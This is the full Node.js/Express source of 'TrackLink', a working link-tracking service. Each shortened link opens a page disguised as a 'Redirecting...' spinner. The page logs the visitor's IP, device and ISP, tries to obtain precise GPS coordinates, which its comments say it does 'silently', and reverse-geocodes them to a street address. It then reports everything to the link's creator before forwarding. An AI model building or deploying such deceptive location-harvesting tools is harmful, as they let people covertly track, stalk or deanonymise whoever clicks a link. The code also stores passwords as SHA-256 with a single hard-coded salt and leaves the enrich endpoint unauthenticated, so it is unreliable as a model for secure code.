const express = require('express');
const Database = require('better-sqlite3');
const UAParser = require('ua-parser-js');
const QRCode = require('qrcode');
const crypto = require('crypto');
const path = require('path');

const app = express();
const db = new Database('tracklink.db');

function genId() { return crypto.randomBytes(5).toString('hex'); }
function genToken() { return crypto.randomBytes(32).toString('hex'); }
function hashPass(p) { return crypto.createHash('sha256').update(p + 'tl_salt_2024').digest('hex'); }

// ─── DB ──────────────────────────────────────────────────────────────────────
db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id TEXT PRIMARY KEY, username TEXT UNIQUE NOT NULL,
    email TEXT UNIQUE NOT NULL, password TEXT NOT NULL, created TEXT NOT NULL
  );
  CREATE TABLE IF NOT EXISTS sessions (
    token TEXT PRIMARY KEY, user_id TEXT NOT NULL, created TEXT NOT NULL,
    FOREIGN KEY(user_id) REFERENCES users(id)
  );
  CREATE TABLE IF NOT EXISTS links (
    id TEXT PRIMARY KEY, user_id TEXT NOT NULL, slug TEXT UNIQUE NOT NULL,
    label TEXT, target TEXT NOT NULL, created TEXT NOT NULL,
    FOREIGN KEY(user_id) REFERENCES users(id)
  );
  CREATE TABLE IF NOT EXISTS visits (
    id TEXT PRIMARY KEY, link_id TEXT NOT NULL,
    ip TEXT, ip_type TEXT,
    country TEXT, country_code TEXT, city TEXT, region TEXT, zip TEXT,
    lat REAL, lon REAL,
    gps_lat REAL, gps_lon REAL, gps_accuracy REAL, gps_address TEXT,
    timezone TEXT, isp TEXT, org TEXT, as_number TEXT,
    is_proxy INTEGER DEFAULT 0, is_vpn INTEGER DEFAULT 0, is_mobile INTEGER DEFAULT 0,
    browser TEXT, browser_ver TEXT, browser_engine TEXT,
    os TEXT, os_ver TEXT, device TEXT, device_brand TEXT, device_model TEXT, cpu_arch TEXT,
    referrer TEXT, referrer_domain TEXT, ua TEXT,
    language TEXT, screen TEXT, color_depth TEXT, timezone_client TEXT, platform TEXT,
    time TEXT NOT NULL,
    FOREIGN KEY(link_id) REFERENCES links(id)
  );
`);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function requireAuth(req, res, next) {
  const token = req.headers['x-auth-token'];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  const session = db.prepare('SELECT s.*, u.username, u.id as uid FROM sessions s JOIN users u ON u.id=s.user_id WHERE s.token=?').get(token);
  if (!session) return res.status(401).json({ error: 'Invalid session' });
  req.user = { id: session.uid, username: session.username };
  next();
}

function getIP(req) {
  return (req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] ||
    (req.headers['x-forwarded-for']||'').split(',')[0].trim() ||
    req.socket.remoteAddress || '0.0.0.0').replace('::ffff:','');
}

async function geoLocate(ip) {
  const isPrivate = ['127.0.0.1','::1','0.0.0.0'].includes(ip) ||
    ip.startsWith('192.168.')||ip.startsWith('10.')||ip.startsWith('172.16.');
  if (isPrivate) return { country:'Local',country_code:'LO',city:'Localhost',region:'',zip:'',lat:0,lon:0,timezone:'Local',isp:'Local',org:'',as_number:'',is_proxy:0,is_mobile:0,ip_type:'private' };
  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,mobile,hosting`);
    const d = await r.json();
    if (d.status==='success') return {
      country:d.country, country_code:d.countryCode, city:d.city, region:d.regionName,
      zip:d.zip, lat:d.lat, lon:d.lon, timezone:d.timezone, isp:d.isp, org:d.org,
      as_number:d.as, is_proxy:d.proxy?1:0, is_vpn:d.proxy?1:0, is_mobile:d.mobile?1:0,
      ip_type:d.hosting?'hosting':'residential'
    };
  } catch(_) {}
  return { country:'Unknown',country_code:'??',city:'Unknown',region:'',zip:'',lat:0,lon:0,timezone:'',isp:'',org:'',as_number:'',is_proxy:0,is_mobile:0,ip_type:'unknown' };
}

function parseUA(ua) {
  const r = new UAParser(ua).getResult();
  return {
    browser:r.browser.name||'Unknown', browser_ver:r.browser.major||'',
    browser_engine:r.engine.name||'', os:r.os.name||'Unknown', os_ver:r.os.version||'',
    device:r.device.type||'desktop', device_brand:r.device.vendor||'',
    device_model:r.device.model||'', cpu_arch:r.cpu.architecture||''
  };
}
function refDomain(ref) {
  if (!ref||ref==='Direct') return 'Direct';
  try { return new URL(ref).hostname; } catch { return ref; }
}

// ── AUTH ──────────────────────────────────────────────────────────────────────
app.post('/api/register', (req, res) => {
  const { username, email, password } = req.body;
  if (!username||!email||!password) return res.status(400).json({ error:'All fields required' });
  if (password.length<6) return res.status(400).json({ error:'Password must be at least 6 characters' });
  const id = genId();
  try {
    db.prepare('INSERT INTO users (id,username,email,password,created) VALUES (?,?,?,?,?)')
      .run(id, username.trim().toLowerCase(), email.trim().toLowerCase(), hashPass(password), new Date().toISOString());
    const token = genToken();
    db.prepare('INSERT INTO sessions (token,user_id,created) VALUES (?,?,?)').run(token, id, new Date().toISOString());
    res.json({ token, username: username.trim().toLowerCase() });
  } catch(e) {
    if (e.message.includes('UNIQUE')) {
      if (e.message.includes('username')) return res.status(409).json({ error:'Username already taken' });
      if (e.message.includes('email')) return res.status(409).json({ error:'Email already registered' });
    }
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  if (!username||!password) return res.status(400).json({ error:'All fields required' });
  const user = db.prepare('SELECT * FROM users WHERE username=? OR email=?').get(username.trim().toLowerCase(), username.trim().toLowerCase());
  if (!user||user.password!==hashPass(password)) return res.status(401).json({ error:'Invalid username or password' });
  const token = genToken();
  db.prepare('INSERT INTO sessions (token,user_id,created) VALUES (?,?,?)').run(token, user.id, new Date().toISOString());
  res.json({ token, username: user.username });
});

app.post('/api/logout', (req, res) => {
  const token = req.headers['x-auth-token'];
  if (token) db.prepare('DELETE FROM sessions WHERE token=?').run(token);
  res.json({ ok:true });
});

app.get('/api/me', requireAuth, (req, res) => res.json({ username:req.user.username, id:req.user.id }));

// ── LINKS ─────────────────────────────────────────────────────────────────────
app.post('/api/links', requireAuth, (req, res) => {
  const { target, label, slug:cs } = req.body;
  if (!target) return res.status(400).json({ error:'Target URL required' });
  try { new URL(target); } catch { return res.status(400).json({ error:'Invalid URL' }); }
  const slug = cs?.trim().replace(/\s+/g,'-').toLowerCase() || genId();
  const id = genId();
  try {
    db.prepare('INSERT INTO links (id,user_id,slug,label,target,created) VALUES (?,?,?,?,?,?)')
      .run(id, req.user.id, slug, label||target, target, new Date().toISOString());
    res.json({ id, slug, label:label||target, target });
  } catch(e) {
    if (e.message.includes('UNIQUE')) return res.status(409).json({ error:'Slug already taken' });
    res.status(500).json({ error:e.message });
  }
});

app.get('/api/links', requireAuth, (req, res) => {
  res.json(db.prepare('SELECT l.*,COUNT(v.id) as clicks FROM links l LEFT JOIN visits v ON v.link_id=l.id WHERE l.user_id=? GROUP BY l.id ORDER BY l.created DESC').all(req.user.id));
});

app.delete('/api/links/:id', requireAuth, (req, res) => {
  const link = db.prepare('SELECT * FROM links WHERE id=? AND user_id=?').get(req.params.id, req.user.id);
  if (!link) return res.status(404).json({ error:'Not found' });
  db.prepare('DELETE FROM visits WHERE link_id=?').run(req.params.id);
  db.prepare('DELETE FROM links WHERE id=?').run(req.params.id);
  res.json({ ok:true });
});

// ── VISITS ────────────────────────────────────────────────────────────────────
app.get('/api/visits', requireAuth, (req, res) => {
  const { link_id } = req.query;
  const q = link_id
    ? 'SELECT v.*,l.label as link_label,l.slug as link_slug FROM visits v JOIN links l ON l.id=v.link_id WHERE v.link_id=? AND l.user_id=? ORDER BY v.time DESC LIMIT 500'
    : 'SELECT v.*,l.label as link_label,l.slug as link_slug FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? ORDER BY v.time DESC LIMIT 500';
  res.json(link_id ? db.prepare(q).all(link_id, req.user.id) : db.prepare(q).all(req.user.id));
});

// Delete single visit
app.delete('/api/visits/:id', requireAuth, (req, res) => {
  const visit = db.prepare('SELECT v.* FROM visits v JOIN links l ON l.id=v.link_id WHERE v.id=? AND l.user_id=?').get(req.params.id, req.user.id);
  if (!visit) return res.status(404).json({ error:'Not found' });
  db.prepare('DELETE FROM visits WHERE id=?').run(req.params.id);
  res.json({ ok:true });
});

// Clear all visits for a link (or all links)
app.delete('/api/visits', requireAuth, (req, res) => {
  const { link_id } = req.query;
  if (link_id) {
    const link = db.prepare('SELECT * FROM links WHERE id=? AND user_id=?').get(link_id, req.user.id);
    if (!link) return res.status(404).json({ error:'Not found' });
    db.prepare('DELETE FROM visits WHERE link_id=?').run(link_id);
  } else {
    const links = db.prepare('SELECT id FROM links WHERE user_id=?').all(req.user.id);
    links.forEach(l => db.prepare('DELETE FROM visits WHERE link_id=?').run(l.id));
  }
  res.json({ ok:true });
});

app.get('/api/stats', requireAuth, (req, res) => {
  const uid = req.user.id;
  const today = new Date().toISOString().split('T')[0];
  res.json({
    total_clicks: db.prepare('SELECT COUNT(*) as c FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=?').get(uid).c,
    unique_ips:   db.prepare('SELECT COUNT(DISTINCT v.ip) as c FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=?').get(uid).c,
    total_links:  db.prepare('SELECT COUNT(*) as c FROM links WHERE user_id=?').get(uid).c,
    today_clicks: db.prepare("SELECT COUNT(*) as c FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? AND v.time LIKE ?").get(uid, today+'%').c,
    proxy_count:  db.prepare('SELECT COUNT(*) as c FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? AND v.is_proxy=1').get(uid).c,
    gps_count:    db.prepare('SELECT COUNT(*) as c FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? AND v.gps_lat IS NOT NULL AND v.gps_lat!=0').get(uid).c,
    top_countries:db.prepare('SELECT v.country,v.country_code,COUNT(*) as count FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? GROUP BY v.country ORDER BY count DESC LIMIT 8').all(uid),
    top_browsers: db.prepare('SELECT v.browser,COUNT(*) as count FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? GROUP BY v.browser ORDER BY count DESC LIMIT 6').all(uid),
    devices:      db.prepare('SELECT v.device,COUNT(*) as count FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? GROUP BY v.device ORDER BY count DESC').all(uid),
    top_isps:     db.prepare("SELECT v.isp,COUNT(*) as count FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? AND v.isp!='' GROUP BY v.isp ORDER BY count DESC LIMIT 5").all(uid),
    map_points:   db.prepare('SELECT v.id,v.lat,v.lon,v.gps_lat,v.gps_lon,v.city,v.country,v.country_code,v.ip,v.time,v.device,v.browser,v.gps_address,v.gps_accuracy FROM visits v JOIN links l ON l.id=v.link_id WHERE l.user_id=? AND (v.lat!=0 OR (v.gps_lat IS NOT NULL AND v.gps_lat!=0)) ORDER BY v.time DESC LIMIT 300').all(uid),
  });
});

app.get('/api/qr', requireAuth, async (req, res) => {
  const { url } = req.query;
  if (!url) return res.status(400).send('url required');
  try {
    const dataUrl = await QRCode.toDataURL(url, { width:300, margin:2, color:{dark:'#00e5ff',light:'#0a0a0f'} });
    res.json({ qr: dataUrl });
  } catch(e) { res.status(500).json({ error:e.message }); }
});

// ── ENRICH ────────────────────────────────────────────────────────────────────
app.post('/api/enrich/:visitId', (req, res) => {
  const { language, screen, colorDepth, timezone, platform, gps_lat, gps_lon, gps_accuracy, gps_address } = req.body;
  db.prepare('UPDATE visits SET language=?,screen=?,color_depth=?,timezone_client=?,platform=?,gps_lat=?,gps_lon=?,gps_accuracy=?,gps_address=? WHERE id=?')
    .run(language||'', screen||'', colorDepth||'', timezone||'', platform||'',
      gps_lat||null, gps_lon||null, gps_accuracy||null, gps_address||'', req.params.visitId);
  res.json({ ok:true });
});

// ── TRACKER ───────────────────────────────────────────────────────────────────
app.get('/t/:slug', async (req, res) => {
  const link = db.prepare('SELECT * FROM links WHERE slug=?').get(req.params.slug);
  if (!link) return res.status(404).send('Link not found.');

  const visitId = genId();
  const ip = getIP(req);
  const ua = req.headers['user-agent'] || '';
  const referrer = req.headers['referer'] || 'Direct';
  const parsed = parseUA(ua);

  db.prepare('INSERT INTO visits (id,link_id,ip,browser,browser_ver,browser_engine,os,os_ver,device,device_brand,device_model,cpu_arch,referrer,referrer_domain,ua,time) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)')
    .run(visitId, link.id, ip, parsed.browser, parsed.browser_ver, parsed.browser_engine,
      parsed.os, parsed.os_ver, parsed.device, parsed.device_brand, parsed.device_model,
      parsed.cpu_arch, referrer, refDomain(referrer), ua, new Date().toISOString());

  // Serve location capture page
  res.send(`<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Redirecting...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#080810;display:flex;align-items:center;justify-content:center;min-height:100vh;}
.s{width:44px;height:44px;border:3px solid #1c1c2e;border-top-color:#00e5ff;border-radius:50%;animation:sp 1s linear infinite;}
@keyframes sp{to{transform:rotate(360deg)}}
</style>
</head>
<body><div class="s"></div>
<script>
const VID='${visitId}';
const TARGET='${link.target.replace(/\\/g,'\\\\').replace(/'/g,"\\'")}';

async function revGeo(lat,lon){
  try{
    const r=await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+lat+'&lon='+lon+'&zoom=18&addressdetails=1',{headers:{'Accept-Language':'en'}});
    const d=await r.json();
    return d.display_name||'';
  }catch(e){return '';}
}

async function send(data){
  try{
    await fetch('/api/enrich/'+VID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
  }catch(e){}
}

async function run(){
  const base={
    language:navigator.language||navigator.userLanguage||'',
    screen:screen.width+'x'+screen.height,
    colorDepth:screen.colorDepth||'',
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||'',
    platform:navigator.platform||navigator.userAgentData?.platform||''
  };

  // Try high-accuracy GPS first, then fallback, then IP only
  if(navigator.geolocation){
    // Try to get location silently with high accuracy
    const tryGPS=(opts)=>new Promise((resolve)=>{
      navigator.geolocation.getCurrentPosition(
        pos=>resolve(pos),
        err=>resolve(null),
        opts
      );
    });

    // First try high accuracy
    let pos=await tryGPS({enableHighAccuracy:true,timeout:6000,maximumAge:0});
    // If failed, try low accuracy (usually faster, no popup on some browsers)
    if(!pos) pos=await tryGPS({enableHighAccuracy:false,timeout:4000,maximumAge:60000});

    if(pos){
      const lat=pos.coords.latitude;
      const lon=pos.coords.longitude;
      const acc=pos.coords.accuracy;
      const addr=await revGeo(lat,lon);
      await send({...base,gps_lat:lat,gps_lon:lon,gps_accuracy:acc,gps_address:addr});
    } else {
      await send(base);
    }
  } else {
    await send(base);
  }
  window.location.replace(TARGET);
}
run();
</script>
</body>
</html>`);

  // IP geo in background
  geoLocate(ip).then(geo => {
    db.prepare('UPDATE visits SET country=?,country_code=?,city=?,region=?,zip=?,lat=?,lon=?,timezone=?,isp=?,org=?,as_number=?,is_proxy=?,is_vpn=?,is_mobile=?,ip_type=? WHERE id=?')
      .run(geo.country,geo.country_code,geo.city,geo.region,geo.zip,geo.lat,geo.lon,geo.timezone,geo.isp,geo.org,geo.as_number,geo.is_proxy,geo.is_vpn||0,geo.is_mobile,geo.ip_type||'',visitId);
  });
});

app.use(express.static(path.join(__dirname,'public')));
app.get('*',(req,res)=>res.sendFile(path.join(__dirname,'public','index.html')));

const PORT = process.env.PORT||3000;
app.listen(PORT,()=>console.log(`\n  🔗 TrackLink → http://localhost:${PORT}\n`));
